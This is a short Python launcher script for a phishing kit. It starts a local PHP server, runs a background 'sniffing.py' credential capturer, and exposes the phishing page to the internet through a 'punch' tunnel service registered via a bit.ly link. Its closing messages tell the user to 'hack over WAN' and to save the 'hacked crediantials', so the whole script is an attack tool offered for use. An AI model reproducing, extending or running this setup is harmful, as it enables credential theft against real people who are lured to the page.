#!/usr/bin/env python
#written by mrAnonymous

import os
import time
import subprocess
import sys

Green="\033[1;33m"
Blue="\033[1;34m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"
Purple="\033[0;35m"

time.sleep(2)
os.system('clear')
print ("")
sys.stdout.write(" "+Purple+" Installation started")
time.sleep(2)
print (" "+Purple+"[1] Register using to punch tunnels using ur email "+Reset+" ")
time.sleep(4)
os.system('firefox https://bit.ly/2HqLkGk &')
time.sleep(2)
print ("")
print ("  "+Purple+"[2] put ur email as username followd by ur password "+Reset+" ")
subprocess.call('cd punch-server && ./punch setup',shell=True)
time.sleep(2)
os.system('clear')
os.system('cat data.txt > data.txt')
os.system('xterm -T "php local sever" -e "php -S 127.0.0.1:80" &')
os.system('chmod -R 777 sniffing.py')
subprocess.call('python sniffing.py &',shell=True)
os.system("")
os.system('xterm -T "Punch server" -e "cd punch-server && ./punch http 80" &')
print("NOW access ur phishing page here http://localhost/ in localy and use punch link to hack over WAN")
print("Dont forget to save ur hacked logs!! if u run this script next time will reset all ur hacked crediantials")
